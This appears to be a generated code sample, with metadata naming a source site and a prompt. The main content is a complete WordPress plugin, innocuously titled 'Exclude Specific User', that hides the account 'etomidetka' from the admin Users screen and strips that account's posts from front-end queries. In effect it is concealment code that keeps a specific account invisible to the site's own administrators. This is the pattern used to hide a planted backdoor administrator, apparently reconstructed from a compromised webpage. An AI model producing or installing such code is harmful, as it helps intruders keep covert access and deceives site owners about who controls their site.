"""
Generated Code Metadata:
========================
Original URL: https://pizzacone.ae
Prompt: Write a WordPress plugin that uses `add_filter` and `add_action` to exclude a specific user (e.g., "etomidetka") from the admin user list and post queries, similar to the functionality described on the webpage.
Generated: DETERMINISTIC_b6c1f73cb18c1d49
Batch ID: 20250612_152924
URLs Found: 0
Malicious URLs: 0

Oracle Results:
No URLs checked
"""

# Generated Code:
# ===============

```php
<?php
/**
 * Plugin Name: Exclude Specific User
 * Description: Excludes a specific user from admin user list and post queries.
 * Version: 1.0
 * Author: Your Name
 * License: GPL2
 */

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly
}

class Exclude_Specific_User {
    /**
     * The username to exclude
     * @var string
     */
    private $excluded_username = 'etomidetka';

    /**
     * Initialize the plugin
     */
    public function __construct() {
        add_action('pre_get_users', array($this, 'exclude_user_from_admin_list'));
        add_action('pre_get_posts', array($this, 'exclude_user_posts_from_queries'));
    }

    /**
     * Exclude the specific user from admin user list
     * @param WP_User_Query $query
     */
    public function exclude_user_from_admin_list($query) {
        if (!is_admin()) {
            return;
        }

        $screen = get_current_screen();
        if ($screen && $screen->id === 'users') {
            $excluded_user = get_user_by('login', $this->excluded_username);
            if ($excluded_user) {
                $excluded_id = $excluded_user->ID;
                $query->set('exclude', array($excluded_id));
            }
        }
    }

    /**
     * Exclude posts by the specific user from queries
     * @param WP_Query $query
     */
    public function exclude_user_posts_from_queries($query) {
        if (is_admin()) {
            return;
        }

        $excluded_user = get_user_by('login', $this->excluded_username);
        if ($excluded_user) {
            $excluded_id = $excluded_user->ID;
            $query->set('author__not_in', array($excluded_id));
        }
    }
}

// Initialize the plugin
new Exclude_Specific_User();
```
